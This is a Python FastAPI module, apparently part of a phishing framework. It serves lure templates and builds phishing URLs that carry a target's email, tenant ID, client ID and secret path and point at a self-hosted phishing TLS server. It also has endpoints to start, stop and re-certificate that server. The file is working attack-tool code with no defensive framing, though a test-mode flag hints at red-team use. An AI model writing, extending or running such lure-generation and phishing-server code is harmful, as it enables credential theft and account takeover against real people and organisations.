"""Phishing server + lure generation endpoints.

The phishing TLS server is managed by services/webserver_manager.py.
Lure templates are read from apps.json / auth_apps.json on disk.
"""
from __future__ import annotations

import json
import uuid
from pathlib import Path
from typing import Optional

from fastapi import APIRouter, HTTPException
from pydantic import BaseModel

from app.config import (
    APPS_FILE, AUTH_APPS_FILE, CERT_DIR, CERT_FILE, KEY_FILE,
    PHISH_HOST, PHISH_PORT, TEST_MODE, WEBSERVER_SCRIPT,
)
from app.services import webserver_manager

router = APIRouter(prefix="/phish", tags=["Phishing"])


class LureIn(BaseModel):
    template: str
    secret_path: Optional[str] = None
    client_id: Optional[str] = None
    tenant_id: Optional[str] = None
    target_email: Optional[str] = None
    source_file: Optional[str] = "apps.json"


class WebServerStartIn(BaseModel):
    host: Optional[str] = None
    port: Optional[int] = None


def _load_json(path: Path) -> list:
    if not path.is_file():
        return []
    try:
        with path.open("r", encoding="utf-8") as f:
            data = json.load(f)
        return data if isinstance(data, list) else []
    except (json.JSONDecodeError, OSError):
        return []


# ---------- lure templates & generation ------------------------------------

@router.get("/apps")
def list_apps(source: str = "apps.json"):
    """List lure templates from apps.json / auth_apps.json on disk."""
    if source == "auth_apps.json":
        path = AUTH_APPS_FILE
    else:
        path = APPS_FILE
    apps = _load_json(path)
    return {
        "source": path.name,
        "present": path.is_file(),
        "count": len(apps),
        "apps": apps,
    }


@router.get("/templates")
def list_templates():
    """Flattened view of both apps.json and auth_apps.json, deduplicated."""
    combined = []
    seen = set()
    for path in (APPS_FILE, AUTH_APPS_FILE):
        if not path.is_file():
            continue
        for entry in _load_json(path):
            cid = entry.get("clientId") or entry.get("appId")
            if not cid or cid in seen:
                continue
            seen.add(cid)
            combined.append({**entry, "_source": path.name})
    return {
        "count": len(combined),
        "apps": combined,
        "apps_file": str(APPS_FILE),
        "auth_apps_file": str(AUTH_APPS_FILE),
    }


@router.post("/lure/generate")
def generate_lure(req: LureIn):
    """Build a lure URL pointing at the running phish server."""
    secret = req.secret_path or uuid.uuid4().hex[:12]
    client_id = req.client_id
    if not client_id:
        apps = _load_json(APPS_FILE) + _load_json(AUTH_APPS_FILE)
        if apps:
            client_id = apps[0].get("clientId") or apps[0].get("appId")
    client_id = client_id or "d3590ed6-52b3-4102-aeff-aad2292ab01c"

    status = webserver_manager.status()
    host = status.get("host") or PHISH_HOST
    port = status.get("port") or PHISH_PORT
    base = f"https://{host}:{port}"

    qs = [f"client_id={client_id}"]
    if req.tenant_id:
        qs.append(f"tenant={req.tenant_id}")
    if req.target_email:
        qs.append(f"email={req.target_email}")
    qs.append(f"template={req.template}")
    qs.append(f"secret={secret}")

    url = f"{base}/{req.template}/{secret}?" + "&".join(qs)

    return {
        "ok": True,
        "test_mode": TEST_MODE,
        "url": url,
        "template": req.template,
        "secret_path": secret,
        "client_id": client_id,
        "tenant_id": req.tenant_id,
        "target_email": req.target_email,
        "source_file": req.source_file,
        "webserver_running": status.get("running", False),
        "webserver_pid": status.get("pid"),
    }


# ---------- webserver lifecycle --------------------------------------------

@router.get("/server/status")
def server_status():
    s = webserver_manager.status()
    s.update({
        "cert_dir": str(CERT_DIR),
        "cert_file": str(CERT_FILE),
        "key_file": str(KEY_FILE),
        "webserver_script": str(WEBSERVER_SCRIPT),
    })
    return s


@router.post("/server/start")
def server_start(req: WebServerStartIn):
    return webserver_manager.start(host=req.host, port=req.port)


@router.post("/server/stop")
def server_stop():
    return webserver_manager.stop()


@router.post("/server/reload-certs")
def server_reload_certs():
    return webserver_manager.reload_certs()